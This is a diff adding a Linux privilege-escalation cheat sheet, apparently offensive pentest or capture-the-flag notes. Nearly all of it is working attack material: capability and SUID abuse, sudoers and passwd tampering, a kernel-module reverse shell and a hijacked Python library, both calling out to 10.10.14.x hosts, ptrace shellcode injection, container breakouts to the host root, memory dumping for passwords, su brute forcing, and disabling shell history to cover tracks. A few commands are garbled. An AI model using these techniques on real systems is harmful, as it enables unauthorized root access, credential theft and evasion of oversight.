@@ -1,0 +1,695 @@
+1. check what can be run with the eleveated permissions
+
+sudo -l
+
+2. check what sticky bits are avilable 
+
+Find / -perm –4000 2>/dev/null      
+For example, if a suid binary calls /usr/sbin/service you can try to create the function and export it
+
+function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+Then, when you call the suid binary, this function will be executed
+
+
+3. Check linux capabilities 
+
+/sbin/getcap -r 2>/dev/null            
+
+if you have capabilities for:
+cap_sys_admin
+cp /etc/passwd ./ #Create a copy of the passwd file
+openssl passwd -1 -salt abc password #Get hash of "password"
+vim ./passwd #Change roots passwords of the fake passwd file
+
+And finally mount the modified passwd file on /etc/passwd via the following python script
+
+from ctypes import *
+libc = CDLL("libc.so.6")
+libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
+MS_BIND = 4096
+source = b"/path/to/fake/passwd"
+target = b"/etc/passwd"
+filesystemtype = b"none"
+options = b"rw"
+mountflags = MS_BIND
+libc.mount(source, target, filesystemtype, mountflags, options)
+
+python <your_script>
+
+And you will be able to su as root using password "password"
+
+cap_dac_read_search  
+
+/usr/bin/tac /etc/shadow
+
+or
+
+cd /etc
+tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
+cd /tmp
+tar -cxf shadow.tar.gz
+
+or
+print(open("/etc/shadow", "r").read()) 
+
+ or
+
+gcc shocker.c - o shocker (see Appendix for the code)
+
+#transfer to the victim
+
+./shocker <target_file> <destination_file>
+./shocker /root/root.txt /tmp/root.txt
+
+cap_dac_override
+
+vim /etc/passwd  #or shadow or sudoers
+
+or 
+file=open("/etc/sudoers","a")
+file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
+file.close()
+
+cap_chown
+
+python -c 'import os;os.chown("/etc/shadow",1000,1000)'
+
+or
+ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
+
+cap_fowner
+
+python -c 'import os;os.chmod("/etc/shadow",0666)
+
+
+cap_setuid
+import os
+os.setuid(0)
+os.system("/bin/bash")
+
+or
+
+import os
+import prctl
+#add the capability to the effective set
+prctl.cap_effective.setuid = True
+os.setuid(0)
+os.system("/bin/bash")
+
+
+cap_setgid
+
+#Find every file writable by a group
+find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file writable by a group in /etc with a maxpath of 1
+find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
+#Find every file readable by a group in /etc with a maxpath of 1
+find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
+
+Once you have find a file you can abuse (via reading or writing) to escalate privileges you can get a shell impersonating the interesting group with:
+
+import os
+os.setgid(42)
+os.system("/bin/bash")
+
+In this case the group shadow(42) was impersonated so you can read the file /etc/shadow:
+
+cat /etc/shadow
+
+cap_setfcap
+
+create the following python script
+
+import ctypes, sys
+
+#Load needed library
+#You can find which library you need to load checking the libraries of local setcap binary
+# ldd /sbin/setcap
+libcap = ctypes.cdll.LoadLibrary("libcap.so.2")
+
+libcap.cap_from_text.argtypes = [ctypes.c_char_p]
+libcap.cap_from_text.restype = ctypes.c_void_p
+libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]
+
+#Give setuid cap to the binary
+cap = 'cap_setuid+ep'
+path = sys.argv[1]
+print(path)
+cap_t = libcap.cap_from_text(cap)
+status = libcap.cap_set_file(path,cap_t)
+
+if(status == 0):
+    print (cap + " was successfully added to " + path)
+
+
+python setcapability.py /usr/bin/python2.7
+
+and now you gave python the SETUID capabilities so exploit it as above
+
+cap_netadmin
+#Dump iptables filter table rules
+import iptc
+import pprint
+json=iptc.easy.dump_table('filter',ipv6=False)
+pprint.pprint(json)
+
+#Flush iptables filter table
+import iptc
+iptc.easy.flush_table('filter')
+
+cap_sys_module
+
+create reverse-shell.c file with the following content
+#include <linux/kmod.h>
+#include <linux/module.h>
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("AttackDefense");
+MODULE_DESCRIPTION("LKM reverse shell module");
+MODULE_VERSION("1.0");
+
+char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
+static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
+
+// call_usermodehelper function is used to create user mode processes from kernel space
+static int __init reverse_shell_init(void) {
+    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+}
+
+static void __exit reverse_shell_exit(void) {
+    printk(KERN_INFO "Exiting\n");
+}
+
+module_init(reverse_shell_init);
+module_exit(reverse_shell_exit);
+
+
+
+
+create Makefile with the following content
+
+obj-m +=reverse-shell.o
+
+all:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+
+clean:
+    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+
+
+make 
+#you should get reverse-shell.ko file
+# transport this file to the victim
+
+insmod reverse-shell.ko
+if everything went right you will automatically get a shell
+cap_sys_ptrace
+
+create the following python script
+
+import ctypes
+import sys
+import struct
+# Macros defined in <sys/ptrace.h>
+# https://code.woboq.org/qt5/include/sys/ptrace.h.html
+PTRACE_POKETEXT = 4
+PTRACE_GETREGS = 12
+PTRACE_SETREGS = 13
+PTRACE_ATTACH = 16
+PTRACE_DETACH = 17
+# Structure defined in <sys/user.h>
+# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
+class user_regs_struct(ctypes.Structure):
+    _fields_ = [
+        ("r15", ctypes.c_ulonglong),
+        ("r14", ctypes.c_ulonglong),
+        ("r13", ctypes.c_ulonglong),
+        ("r12", ctypes.c_ulonglong),
+        ("rbp", ctypes.c_ulonglong),
+        ("rbx", ctypes.c_ulonglong),
+        ("r11", ctypes.c_ulonglong),
+        ("r10", ctypes.c_ulonglong),
+        ("r9", ctypes.c_ulonglong),
+        ("r8", ctypes.c_ulonglong),
+        ("rax", ctypes.c_ulonglong),
+        ("rcx", ctypes.c_ulonglong),
+        ("rdx", ctypes.c_ulonglong),
+        ("rsi", ctypes.c_ulonglong),
+        ("rdi", ctypes.c_ulonglong),
+        ("orig_rax", ctypes.c_ulonglong),
+        ("rip", ctypes.c_ulonglong),
+        ("cs", ctypes.c_ulonglong),
+        ("eflags", ctypes.c_ulonglong),
+        ("rsp", ctypes.c_ulonglong),
+        ("ss", ctypes.c_ulonglong),
+        ("fs_base", ctypes.c_ulonglong),
+        ("gs_base", ctypes.c_ulonglong),
+        ("ds", ctypes.c_ulonglong),
+        ("es", ctypes.c_ulonglong),
+        ("fs", ctypes.c_ulonglong),
+        ("gs", ctypes.c_ulonglong),
+    ]
+
+libc = ctypes.CDLL("libc.so.6")
+
+pid=int(sys.argv[1])
+
+# Define argument type and respone type.
+libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
+libc.ptrace.restype = ctypes.c_uint64
+
+# Attach to the process
+libc.ptrace(PTRACE_ATTACH, pid, None, None)
+registers=user_regs_struct()
+
+# Retrieve the value stored in registers
+libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
+print("Instruction Pointer: " + hex(registers.rip))
+print("Injecting Shellcode at: " + hex(registers.rip))
+
+# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
+shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"
+
+# Inject the shellcode into the running process byte by byte.
+for i in xrange(0,len(shellcode),4):
+    # Convert the byte to little endian.
+    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
+    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
+    shellcode_byte=int(shellcode_byte_little_endian,16)
+
+    # Inject the byte.
+    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)
+
+print("Shellcode Injected!!")
+
+# Modify the instuction pointer
+registers.rip=registers.rip+2
+
+# Set the registers
+libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
+print("Final Instruction Pointer: " + hex(registers.rip))
+
+# Detach from the process.
+libc.ptrace(PTRACE_DETACH, pid, None, None)
+
+python <your_file> 
+
+and you should escalate privieleges
+
+
+
+Map groups membership
+Docker
+ docker images
+#you will get a list of images
+
+docker run -v /:/mnt –rm -it <image_from_above>  chroot /mnt sh
+
+
+
+LXD 
+
+git clone https://github.com/saghul/lxd-alpine-builder
+
+cd lxd-alpine-builder
+
+./build-alpine -a i686
+
+#Once this finished, we should have the alpine.tar file
+#transport this file to the victim machine
+
+lxc image import ./alpine*.tar.gz --alias alpine
+
+lxc init alpine privesc -c security.privileged=true
+
+#If you find this error Error: No storage pool found. Please create a new storage pool Run lxd init
+lxc list
+lxc config device add privesc host-root disk source=/ path=/mnt/root/
+
+lxc start privesc
+lxc exec privesc /bin/sh
+
+                                     or
+
+
+#Install requirements
+sudo apt update
+sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
+#Clone repo
+git clone https://github.com/lxc/distrobuilder
+#Make distrobuilder
+cd distrobuilder
+make
+#Prepare the creation of alpine
+mkdir -p $HOME/ContainerImages/alpine/
+cd $HOME/ContainerImages/alpine/
+wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+#Create the container
+sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
+
+
+#Then, upload to the vulnerable server the files lxd.tar.xz and rootfs.squashfs
+
+#Add the image
+lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+lxc image list #You can see your new imported image
+
+
+#Create a container and add root path
+lxc init alpine privesc -c security.privileged=true 
+#If you find this error Error: No storage pool found. Please create a new storage pool Run lxd init
+
+lxc list #List containers
+
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+
+#Execute the container
+
+lxc start privesc
+lxc exec privesc /bin/sh
+
+
+Staff
+Nano /usr/local/bin/run-parts
+(put your reverse shell code there)
+
+Chmod 777 /usr/local/bin/run-parts
+
+Reorganize connection to the machine
+
+Video
+Ls –al /dev | grep fb0   ( you will get the screen of the logged in user)
+Transport result to your machine and  analyze in gimp or sth similar 
+
+Disk
+Ls –al /dev | grep sd 
+
+Debugfs <sd>
+
+ls   #to list available directories e.g root
+cd <root>
+cat <root.txt>
+
+
+ADM
+You can read logs in /var/logs
+
+GRUB
+Find / -group grub -ls 2>/dev/null
+
+To check all files owned by this group
+
+Shadow
+I can read /etc/shadow
+
+cat /etc/shadow
+
+
+Check the internal ports
+
+Nestat –anlp
+Ss –tulpn
+to perform port forwarding for a remote access
+if port 922* if open then use can try to get RCE
+node inspect 127.0.0.1:922*
+debug>exec("process.mainModule.require('child_process').exec('<cmd>')")
+
+Check to whom this box is talking to
+Cat /etc/hosts
+Ifconfig
+Ip addr
+Arp –an
+Ip neigh
+
+
+Check the internal processes
+Ps –aux --forest
+pspy
+
+especially interesting process are:
+tmux  #just copy the entire line and paste to escalate privileges
+
+authenticator
+If authenticator process is running use to following script dump.sh
+#!/bin/bash
+#./dump-memory.sh <PID>
+grep rw-p /proc/$1/maps \
+    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+    | while read start stop; do \
+    gdb --batch --pid $1 -ex \
+    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
+done
+
+./dump.sh <PID_authenticator> > file.dump
+
+strings file.dump | grep -i password
+
+Get access to the mysql database (commonly installed)
+search memory of FTP service to find credentials
+gdb -p <FTP_PROCESS_PID>
+(gdb) info proc mappings
+(gdb) q
+(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
+(gdb) q
+strings /tmp/mem_ftp #User and password
+
+check the version of installed packages
+dpkg -l
+check if any compilers are installed that can be abused for kernel exploits
+(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
+check a presence of dangerous binaries
+which 
+nmap
+ aws
+ nc 
+ncat 
+ nc.traditional 
+wget
+ curl
+ ping
+ gcc
+ g++
+ make
+ gdb 
+base64
+ socat 
+python python2 python3 python2.7 python2.6 python3.6 python3.7 
+perl 
+php
+ ruby
+ xterm
+ doas
+ sudo
+ fetch
+ docker
+ lxc
+ ctr
+ runc
+ rkt
+ kubectl
+ 2>/dev/null
+
+check if any credentials are stored in /etc/fstab
+grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
+
+check if ctr command is available
+
+which ctr
+/usr/bin/ctr
+
+You can list the images:
+
+ctr image list
+REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS 
+registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -      
+registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -      
+
+And then run one of those images mounting the host root folder to it:
+
+ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
+
+
+or you can create a privileged container
+
+ ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
+check /etc/sysconfig/network-scripts
+
+If, for whatever reason, a user is able to write an ifcf-<whatever> script to /etc/sysconfig/network-scripts or it can adjust an existing one, then your system is pwned.
+
+For example: /etc/sysconfig/network-scripts/ifcfg-1337
+
+NAME=Network /bin/id
+ONBOOT=yes
+DEVICE=eth0
+
+ the NAME= attributed in these network scripts is not handled correctly. If you have white/blank space in the name the system tries to execute the part after the white/blank space. This means that everything after the first blank space is executed as root.
+
+check /etc/sudoers.d file
+
+If you can read this file you could be able to obtain some interesting information, and if you can write any file  you will be able to escalate privileges
+
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
+echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
+
+
+
+check what defences are installed
+
+which apparmor_status   #for apparmor
+AppArmor is a kernel enhancement to confine programs to a limited set of resources
+
+if it is enabled you can bypass it by creating the following shell script
+
+echo '#!/usr/bin/perl
+use POSIX qw(strftime);
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh"' > /tmp/test.pl
+chmod +x /tmp/test.pl
+/tmp/test.pl
+
+if you execute the file directly, you will be able to execute whatever you want.
+
+uname -r | grep “\-grsec” #for gr security
+
+which paxctl-ng paxctl  #for paxctl
+
+(cat /etc/sysctl.conf | grep “exec-shield” || echo “exec-shield not found”)  #for exec-shield
+
+(sestatus 2>/dev/null || echo “SE Linux not found”)
+
+check information stored in the environment variables
+(env || set) 2>/dev/null
+
+check crontab
+
+crontab -l
+
+check timers 
+systemctl list-timers –all
+
+Big UID
+as a non privilege user type
+systemd-run -t /bin/bash
+
+you will be asked for a non-privielged user password, type it and you should escalate privileges to the root
+check password policy
+grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
+
+brutforce password for other user by abusing su binary
+
+./suBF.sh -u <user> -t 0,7 -s 0.007
+
+search for hidden files
+
+find / -type f -iname ".*" -ls 2>/dev/null
+
+search for backups
+find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll
+
+search for sensitive information in the logs files
+aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
+grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
+
+hijacking python libraries
+add at the end of the os.py library the following lineadd at the end of the os.py library the following line
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
+check if Kerberos authentication is enabled
+
+cat /etc/pam.d/common-auth
+
+if you have 
+“pam_krb5” it means the kerberos authentication is enabled so
+kinit <compromied_user>
+password: <compromised_password>
+
+Now you generated a ticket for the compromisied user so
+
+ksu
+
+and you should become a root
+
+
+
+check configuration files
+zabbix (/etc/zabbix/zabbix_server.conf)
+apache (/etc/apache2/sites-available/000-default.conf)
+nginx (/etc/nginx/sites-available/000-default.conf)
+mysql (/etc/mysql/my.cnf)
+
+abusing git hooks
+
+cd .git/hooks
+echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
+chmod +x pre-commit
+
+you malicious script will be always executed when a new commit is created:
+
+abusing /etc/ld.so.preload
+create a malicious C file with the following content
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unlink("/etc/ld.so.preload");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+//cd /tmp
+//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+
+echo "/tmp/pe.so" > /etc/ld.so.preload
+
+Execute any binary  with SUID on it 
+
+abusing runc
+
+runc -help #Get help and see if runc is intalled
+runc spec #This will create the config.json file in your current folder
+
+Inside the "mounts" section of the create config.json add the following lines:
+{
+    "type": "bind",
+    "source": "/",
+    "destination": "/",
+    "options": [
+        "rbind",
+        "rw",
+        "rprivate"
+    ]
+},
+
+#Once you have modified the config.json file, create the folder rootfs in the same directory
+mkdir rootfs
+
+# Finally, start the container
+# The root folder is the one from the host
+runc run demo
+
+check for other files containing passwords
+
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+cat /etc/security/opasswd
+locate password | more           
+/boot/grub/i386-pc/password.mod
+/etc/pam.d/common-password
+/etc/pam.d/gdm-password
+/etc/pam.d/gdm-password.original
+/lib/live/config/0031-root-password
+disable writing to the history file
+# Prevent writing to the history file at all
+unset HISTFILE
+
+# Don't save this session's command history in memory
+export HISTSIZE=0
+
+check if any other passwords are stored in the memory
+strings /dev/mem -n10 | grep -i PASS
+
+
